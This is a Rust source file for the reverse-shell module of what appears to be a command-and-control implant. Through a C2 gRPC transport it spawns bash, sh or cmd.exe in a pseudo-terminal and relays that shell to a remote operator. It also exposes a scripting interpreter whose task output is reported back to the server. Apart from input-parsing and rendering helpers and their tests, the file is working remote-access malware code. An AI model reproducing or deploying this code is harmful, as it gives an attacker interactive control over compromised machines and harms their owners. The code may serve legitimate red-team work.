use anyhow::Result;
use pb::c2::{
    ReportTaskOutputRequest, ReverseShellMessageKind, ReverseShellRequest, ReverseShellResponse,
    TaskError, TaskOutput,
};
use portable_pty::{native_pty_system, CommandBuilder, PtySize};
use std::fmt;
use std::io::{BufWriter, Read, Write};
use std::path::Path;
use std::sync::Arc;
use transport::Transport;

use crate::agent::ImixAgent;
use crossterm::{
    cursor,
    style::{Color, SetForegroundColor},
    terminal, QueueableCommand,
};
use eldritch_core::Value;
use eldritch_libagent::agent::Agent;
use eldritch_repl::{Input, Repl, ReplAction};
use eldritchv2::{Interpreter, Printer, Span};

pub async fn run_reverse_shell_pty<T: Transport>(
    task_id: i64,
    cmd: Option<String>,
    mut transport: T,
) -> Result<()> {
    // Channels to manage gRPC stream
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
    let (input_tx, mut input_rx) = tokio::sync::mpsc::channel(1);
    // We will recreate the internal channels needed for the loop.
    let (internal_exit_tx, mut internal_exit_rx) = tokio::sync::mpsc::channel(1);

    #[cfg(debug_assertions)]
    log::info!("starting reverse_shell_pty (task_id={task_id})");

    // First, send an initial registration message
    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            task_id,
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {_err}");
    }

    // Use the native pty implementation for the system
    let pty_system = native_pty_system();

    // Create a new pty
    let pair = match pty_system.openpty(PtySize {
        rows: 24,
        cols: 80,
        pixel_width: 0,
        pixel_height: 0,
    }) {
        Ok(p) => p,
        Err(e) => {
            return Err(e);
        }
    };

    // Spawn command into the pty
    let cmd_builder = match cmd {
        Some(c) => CommandBuilder::new(c),
        None => {
            #[cfg(not(target_os = "windows"))]
            {
                if Path::new("/bin/bash").exists() {
                    CommandBuilder::new("/bin/bash")
                } else {
                    CommandBuilder::new("/bin/sh")
                }
            }
            #[cfg(target_os = "windows")]
            CommandBuilder::new("cmd.exe")
        }
    };

    let mut child = match pair.slave.spawn_command(cmd_builder) {
        Ok(c) => c,
        Err(e) => {
            return Err(e);
        }
    };

    let mut reader = match pair.master.try_clone_reader() {
        Ok(r) => r,
        Err(e) => {
            return Err(e);
        }
    };
    let mut writer = match pair.master.take_writer() {
        Ok(w) => w,
        Err(e) => {
            return Err(e);
        }
    };

    // Spawn task to send PTY output
    const CHUNK_SIZE: usize = 1024;
    tokio::spawn(async move {
        loop {
            let mut buffer = [0; CHUNK_SIZE];
            let n = match reader.read(&mut buffer[..]) {
                Ok(n) => n,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to read pty: {_err}");
                    break;
                }
            };

            if n < 1 {
                match internal_exit_rx.try_recv() {
                    Ok(None) | Err(tokio::sync::mpsc::error::TryRecvError::Empty) => {}
                    Ok(Some(_status)) => {
                        #[cfg(debug_assertions)]
                        log::info!("closing output stream, pty exited: {_status}");
                        break;
                    }
                    Err(tokio::sync::mpsc::error::TryRecvError::Disconnected) => {
                        #[cfg(debug_assertions)]
                        log::info!("closing output stream, exit channel closed");
                    }
                }
                continue;
            }

            if let Err(_err) = output_tx
                .send(ReverseShellRequest {
                    kind: ReverseShellMessageKind::Data.into(),
                    data: buffer[..n].to_vec(),
                    task_id,
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty output failed to queue: {_err}");
                break;
            }

            // Ping to flush
            if let Err(_err) = output_tx
                .send(ReverseShellRequest {
                    kind: ReverseShellMessageKind::Ping.into(),
                    data: Vec::new(),
                    task_id,
                })
                .await
            {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty ping failed: {_err}");
                break;
            }
        }
    });

    // Initiate gRPC stream
    if let Err(e) = transport.reverse_shell(output_rx, input_tx).await {
        let _ = child.kill();
        return Err(e);
    }

    // Handle Input
    loop {
        if let Ok(Some(_status)) = child.try_wait() {
            #[cfg(debug_assertions)]
            log::info!("closing input stream, pty exited: {_status}");
            break;
        }

        if let Some(msg) = input_rx.recv().await {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                continue;
            }
            if let Err(_err) = writer.write_all(&msg.data) {
                #[cfg(debug_assertions)]
                log::error!("reverse_shell_pty failed to write input: {_err}");
            }
        } else {
            let _ = child.kill();
            break;
        }
    }

    let status = child.wait().ok();
    if let Some(s) = status {
        let _ = internal_exit_tx.send(Some(s)).await;
    }

    #[cfg(debug_assertions)]
    log::info!("stopping reverse_shell_pty (task_id={task_id})");
    Ok(())
}

pub async fn run_repl_reverse_shell<T: Transport + Send + Sync + 'static>(
    task_id: i64,
    mut transport: T,
    agent: ImixAgent<T>,
) -> Result<()> {
    // Channels to manage gRPC stream
    let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
    let (input_tx, input_rx) = tokio::sync::mpsc::channel(1);

    #[cfg(debug_assertions)]
    log::info!("starting repl_reverse_shell (task_id={task_id})");

    // Initial Registration
    if let Err(_err) = output_tx
        .send(ReverseShellRequest {
            task_id,
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
        })
        .await
    {
        #[cfg(debug_assertions)]
        log::error!("failed to send initial registration message: {_err}");
    }

    // Initiate gRPC stream
    transport.reverse_shell(output_rx, input_tx).await?;

    // Move logic to blocking thread
    run_repl_loop(task_id, input_rx, output_tx, agent).await;
    Ok(())
}

async fn run_repl_loop<T: Transport + Send + Sync + 'static>(
    task_id: i64,
    mut input_rx: tokio::sync::mpsc::Receiver<ReverseShellResponse>,
    output_tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
    agent: ImixAgent<T>,
) {
    let _ = tokio::task::spawn_blocking(move || {
        let printer = Arc::new(ShellPrinter {
            tx: output_tx.clone(),
            task_id,
            agent: agent.clone(),
        });

        let mut interpreter = Interpreter::new_with_printer(printer)
            .with_default_libs()
            .with_task_context(Arc::new(agent), task_id, Vec::new());
        let mut repl = Repl::new();
        let stdout = VtWriter {
            tx: output_tx,
            task_id,
        };
        let mut stdout = BufWriter::new(stdout);

        let _ = render(&mut stdout, &repl);

        // State machine for VT100 parsing
        let mut parser = InputParser::new();

        while let Some(msg) = input_rx.blocking_recv() {
            if msg.kind == ReverseShellMessageKind::Ping as i32 {
                continue;
            }
            if msg.data.is_empty() {
                continue;
            }

            // Parse input
            let inputs = parser.parse(&msg.data);
            let mut pending_render = false;

            for (i, input) in inputs.iter().enumerate() {
                #[cfg(debug_assertions)]
                log::info!("Handling input: {input:?}");
                let action = repl.handle_input(input.clone());
                match action {
                    ReplAction::Render => {
                        pending_render = true;
                    }
                    other => {
                        // If we have a pending render from previous inputs, do it now
                        // before processing a non-render action (like Submit) which relies on visual state.
                        if pending_render {
                            let _ = render(&mut stdout, &repl);
                            pending_render = false;
                        }

                        match other {
                            ReplAction::Quit => return,
                            ReplAction::Submit { code, .. } => {
                                // Move to next line
                                let _ = stdout.write_all(b"\r\n");
                                let _ = stdout.flush();

                                // Execute
                                match interpreter.interpret(&code) {
                                    Ok(v) => {
                                        if !matches!(v, Value::None) {
                                            let s = format!("{v:?}\r\n");
                                            let _ = stdout.write(s.as_bytes());
                                        }
                                    }
                                    Err(e) => {
                                        let s = format!("Error: {e}\r\n");
                                        let _ = stdout.write(s.as_bytes());
                                    }
                                }
                                let _ = render(&mut stdout, &repl);
                            }
                            ReplAction::AcceptLine { .. } => {
                                let _ = stdout.write_all(b"\r\n");
                                let _ = render(&mut stdout, &repl);
                            }
                            ReplAction::ClearScreen => {
                                let _ = stdout.queue(terminal::Clear(terminal::ClearType::All));
                                let _ = stdout.queue(cursor::MoveTo(0, 0));
                                let _ = render(&mut stdout, &repl);
                            }
                            ReplAction::Complete => {
                                let state = repl.get_render_state();
                                let (start, completions) =
                                    interpreter.complete(&state.buffer, state.cursor);
                                repl.set_suggestions(completions, start);
                                let _ = render(&mut stdout, &repl);
                            }
                            ReplAction::None => {}
                            ReplAction::Render => unreachable!(),
                        }
                    }
                }

                // If this is the last input and we have a pending render, flush it.
                if i == inputs.len() - 1 && pending_render {
                    let _ = render(&mut stdout, &repl);
                    pending_render = false;
                }
            }
        }
    })
    .await;
}

struct ShellPrinter<T: Transport> {
    tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
    task_id: i64,
    agent: ImixAgent<T>,
}

impl<T: Transport + Send + Sync> fmt::Debug for ShellPrinter<T> {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("ShellPrinter")
            .field("task_id", &self.task_id)
            .finish()
    }
}

impl<T: Transport + Send + Sync + 'static> Printer for ShellPrinter<T> {
    fn print_out(&self, _span: &Span, s: &str) {
        // Send to REPL
        let s_crlf = s.replace('\n', "\r\n");
        let display_s = format!("{s_crlf}\r\n");
        let _ = self.tx.blocking_send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Data.into(),
            data: display_s.into_bytes(),
            task_id: self.task_id,
        });

        // Report Task Output
        let req = ReportTaskOutputRequest {
            output: Some(TaskOutput {
                id: self.task_id,
                output: format!("{s}\n"),
                error: None,
                exec_started_at: None,
                exec_finished_at: None,
            }),
        };
        let _ = self.agent.report_task_output(req);
    }

    fn print_err(&self, _span: &Span, s: &str) {
        let s_crlf = s.replace('\n', "\r\n");
        let display_s = format!("{s_crlf}\r\n");
        let _ = self.tx.blocking_send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Data.into(),
            data: display_s.into_bytes(),
            task_id: self.task_id,
        });

        let req = ReportTaskOutputRequest {
            output: Some(TaskOutput {
                id: self.task_id,
                output: String::new(),
                error: Some(TaskError {
                    msg: format!("{s}\n"),
                }),
                exec_started_at: None,
                exec_finished_at: None,
            }),
        };
        let _ = self.agent.report_task_output(req);
    }
}

struct VtWriter {
    tx: tokio::sync::mpsc::Sender<ReverseShellRequest>,
    task_id: i64,
}

impl std::io::Write for VtWriter {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let data = buf.to_vec();
        match self.tx.blocking_send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Data.into(),
            data,
            task_id: self.task_id,
        }) {
            Ok(_) => Ok(buf.len()),
            Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
        }
    }

    fn flush(&mut self) -> std::io::Result<()> {
        match self.tx.blocking_send(ReverseShellRequest {
            kind: ReverseShellMessageKind::Ping.into(),
            data: Vec::new(),
            task_id: self.task_id,
        }) {
            Ok(_) => Ok(()),
            Err(e) => Err(std::io::Error::new(std::io::ErrorKind::BrokenPipe, e)),
        }
    }
}

/// A robust VT100/ANSI input parser that logs incoming bytes and swallows unknown sequences.
struct InputParser {
    buffer: Vec<u8>,
}

impl InputParser {
    fn new() -> Self {
        Self { buffer: Vec::new() }
    }

    fn parse(&mut self, data: &[u8]) -> Vec<Input> {
        #[cfg(debug_assertions)]
        log::debug!("Received raw bytes: {data:02x?}");

        self.buffer.extend_from_slice(data);
        let mut inputs = Vec::new();

        // Process buffer
        loop {
            if self.buffer.is_empty() {
                break;
            }

            let b = self.buffer[0];

            if b == 0x1b {
                // Potential Escape Sequence
                // We need at least 2 bytes to decide type, or just 1 byte if it's strictly just ESC (unlikely in streams)
                // But we must handle split packets.
                if self.buffer.len() < 2 {
                    // Incomplete, wait for more data
                    break;
                }

                let second = self.buffer[1];
                match second {
                    b'[' => {
                        // CSI Sequence: ESC [ params final
                        // Params: 0x30-0x3F, Intermediate: 0x20-0x2F, Final: 0x40-0x7E
                        let mut end_idx = None;
                        for (i, &byte) in self.buffer.iter().enumerate().skip(2) {
                            if (0x40..=0x7E).contains(&byte) {
                                end_idx = Some(i);
                                break;
                            }
                        }

                        if let Some(end) = end_idx {
                            // We have a complete sequence
                            let seq = &self.buffer[0..=end];
                            if let Some(input) = self.parse_csi(seq) {
                                inputs.push(input);
                            } else {
                                #[cfg(debug_assertions)]
                                log::warn!("Ignored CSI sequence: {seq:02x?}");
                            }
                            // Consume
                            self.buffer.drain(0..=end);
                        } else {
                            // Incomplete CSI or very long garbage
                            if self.buffer.len() > 32 {
                                // Safety valve: sequence too long, probably garbage. Consume ESC and continue.
                                #[cfg(debug_assertions)]
                                log::warn!(
                                    "Dropping long incomplete CSI buffer: {:02x?}",
                                    &self.buffer[..32]
                                );
                                self.buffer.remove(0);
                            } else {
                                // Wait for more data
                                break;
                            }
                        }
                    }
                    b'O' => {
                        // SS3 Sequence: ESC O char
                        if self.buffer.len() < 3 {
                            break;
                        }
                        let code = self.buffer[2];
                        let seq = &self.buffer[0..3];
                        if let Some(input) = self.parse_ss3(code) {
                            inputs.push(input);
                        } else {
                            #[cfg(debug_assertions)]
                            log::warn!("Ignored SS3 sequence: {seq:02x?}");
                        }
                        self.buffer.drain(0..3);
                    }
                    _ => {
                        // Unknown Escape Sequence or Alt+Key
                        // To be safe and avoid "random characters injected", we consume ESC and the next char.
                        #[cfg(debug_assertions)]
                        log::warn!("Unknown Escape sequence start: 1b {second:02x}");
                        self.buffer.drain(0..2);
                    }
                }
            } else {
                // Regular character or Control Code
                match b {
                    b'\r' | b'\n' => inputs.push(Input::Enter),
                    0x7f | 0x08 => inputs.push(Input::Backspace),
                    0x03 => inputs.push(Input::Cancel), // Ctrl+C
                    0x04 => inputs.push(Input::EOF),    // Ctrl+D
                    0x0c => inputs.push(Input::ClearScreen), // Ctrl+L
                    0x09 => inputs.push(Input::Tab),
                    0x12 => inputs.push(Input::HistorySearch), // Ctrl+R
                    0x15 => inputs.push(Input::KillLine),      // Ctrl+U
                    0x0b => inputs.push(Input::KillToEnd),     // Ctrl+K
                    0x17 => inputs.push(Input::WordBackspace), // Ctrl+W
                    0x00 => inputs.push(Input::ForceComplete), // Ctrl+Space
                    x if x >= 0x20 => inputs.push(Input::Char(x as char)),
                    _ => {
                        // Other control codes? Ignore them to prevent weirdness
                        #[cfg(debug_assertions)]
                        log::debug!("Ignored control char: {b:02x}");
                    }
                }
                self.buffer.remove(0);
            }
        }
        inputs
    }

    fn parse_csi(&self, seq: &[u8]) -> Option<Input> {
        // seq is like [0x1b, '[', ..., final]
        // Minimal length 3: \x1b[A
        if seq.len() < 3 {
            return None;
        }

        let final_byte = *seq.last()?;

        // Check for simple no-param sequences
        if seq.len() == 3 {
            return match final_byte {
                b'A' => Some(Input::Up),
                b'B' => Some(Input::Down),
                b'C' => Some(Input::Right),
                b'D' => Some(Input::Left),
                b'H' => Some(Input::Home),
                b'F' => Some(Input::End),
                _ => None,
            };
        }

        // Tilde sequences: \x1b[num~
        // e.g. \x1b[3~ (Del), \x1b[1~ (Home)
        if final_byte == b'~' {
            // Extract number between [ and ~
            let inner = &seq[2..seq.len() - 1];
            if let Ok(s) = std::str::from_utf8(inner) {
                return match s {
                    "1" | "7" => Some(Input::Home),
                    "4" | "8" => Some(Input::End),
                    "3" => Some(Input::Delete),
                    _ => None, // PageUp(5), PageDown(6), Insert(2) - ignore for now
                };
            }
        }

        None
    }

    fn parse_ss3(&self, code: u8) -> Option<Input> {
        match code {
            b'A' => Some(Input::Up),
            b'B' => Some(Input::Down),
            b'C' => Some(Input::Right),
            b'D' => Some(Input::Left),
            b'H' => Some(Input::Home),
            b'F' => Some(Input::End),
            _ => None,
        }
    }
}

fn render<W: std::io::Write>(stdout: &mut W, repl: &Repl) -> std::io::Result<()> {
    let state = repl.get_render_state();

    // Clear everything below the current line to clear old suggestions
    stdout.queue(terminal::Clear(terminal::ClearType::FromCursorDown))?;

    stdout.queue(terminal::Clear(terminal::ClearType::CurrentLine))?;
    stdout.write_all(b"\r")?;

    // Write prompt (Blue)
    stdout.queue(SetForegroundColor(Color::Blue))?;
    stdout.write_all(state.prompt.as_bytes())?;
    stdout.queue(SetForegroundColor(Color::Reset))?;

    // Write buffer
    let buffer_crlf = state.buffer.replace('\n', "\r\n");
    stdout.write_all(buffer_crlf.as_bytes())?;

    // Render suggestions if any
    if let Some(suggestions) = &state.suggestions {
        // Save cursor position
        stdout.queue(cursor::SavePosition)?;
        stdout.queue(cursor::MoveToNextLine(1))?;
        stdout.write_all(b"\r")?;

        if !suggestions.is_empty() {
            let visible_count = 10;
            let len = suggestions.len();
            let idx = state.suggestion_idx.unwrap_or(0);

            let start = if len <= visible_count {
                0
            } else {
                let s = idx.saturating_sub(visible_count / 2);
                if s + visible_count > len {
                    len - visible_count
                } else {
                    s
                }
            };

            let end = std::cmp::min(len, start + visible_count);

            if start > 0 {
                stdout.write_all(b"... ")?;
            }

            for (i, s) in suggestions
                .iter()
                .enumerate()
                .skip(start)
                .take(visible_count)
            {
                if i > start {
                    stdout.write_all(b"  ")?;
                }
                if Some(i) == state.suggestion_idx {
                    // Highlight selected (Black on White)
                    stdout.queue(crossterm::style::SetBackgroundColor(Color::White))?;
                    stdout.queue(SetForegroundColor(Color::Black))?;
                    stdout.write_all(s.as_bytes())?;
                    stdout.queue(crossterm::style::SetBackgroundColor(Color::Reset))?;
                    stdout.queue(SetForegroundColor(Color::Reset))?;
                } else {
                    stdout.write_all(s.as_bytes())?;
                }
            }
            if end < len {
                stdout.write_all(b" ...")?;
            }
        }

        // Restore cursor
        stdout.queue(cursor::RestorePosition)?;
    }

    let cursor_col = state.prompt.len() as u16 + state.cursor as u16;
    stdout.queue(cursor::MoveToColumn(cursor_col))?;

    stdout.flush()?;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_input_parser_simple() {
        let mut parser = InputParser::new();
        let inputs = parser.parse(b"hello");
        assert_eq!(inputs.len(), 5);
        assert_eq!(inputs[0], Input::Char('h'));
    }

    #[test]
    fn test_input_parser_csi_arrow() {
        let mut parser = InputParser::new();
        let inputs = parser.parse(b"\x1b[A");
        assert_eq!(inputs.len(), 1);
        assert_eq!(inputs[0], Input::Up);
    }

    #[test]
    fn test_input_parser_ss3_arrow() {
        let mut parser = InputParser::new();
        let inputs = parser.parse(b"\x1bOA");
        assert_eq!(inputs.len(), 1);
        assert_eq!(inputs[0], Input::Up);
    }

    #[test]
    fn test_input_parser_split_packet() {
        let mut parser = InputParser::new();
        // Packet 1: Partial CSI
        let inputs = parser.parse(b"\x1b[");
        assert_eq!(inputs.len(), 0);

        // Packet 2: Remainder
        let inputs = parser.parse(b"A");
        assert_eq!(inputs.len(), 1);
        assert_eq!(inputs[0], Input::Up);
    }

    #[test]
    fn test_input_parser_unknown_csi_swallowed() {
        let mut parser = InputParser::new();
        // Unknown CSI: \x1b[99;99X (Random Garbage)
        // Should produce NO inputs and NOT leak 'X'
        let inputs = parser.parse(b"\x1b[99;99X");
        assert_eq!(inputs.len(), 0);

        // Verify buffer is drained
        assert!(parser.buffer.is_empty());

        // Followed by valid input
        let inputs = parser.parse(b"A");
        assert_eq!(inputs.len(), 1);
        assert_eq!(inputs[0], Input::Char('A'));
    }

    #[test]
    fn test_input_parser_delete() {
        let mut parser = InputParser::new();
        let inputs = parser.parse(b"\x1b[3~");
        assert_eq!(inputs.len(), 1);
        assert_eq!(inputs[0], Input::Delete);
    }

    #[test]
    fn test_render_multi_line_history() {
        // Setup
        let mut repl = Repl::new();
        // Simulate loading history with multi-line block
        let history = vec!["for i in range(5):\n    print(i)\n    print(i*2)".to_string()];
        repl.load_history(history);

        // Simulate recalling history (Up arrow)
        repl.handle_input(Input::Up);

        // Render to buffer
        let mut stdout = Vec::new();
        render(&mut stdout, &repl).unwrap();

        let output = String::from_utf8_lossy(&stdout);

        // Check that newlines are converted to \r\n
        // The output will contain clearing codes, prompt colors, etc.
        // We look for the sequence:
        // "for i in range(5):\r\n    print(i)\r\n    print(i*2)"

        assert!(output.contains("for i in range(5):\r\n    print(i)\r\n    print(i*2)"));
    }
}
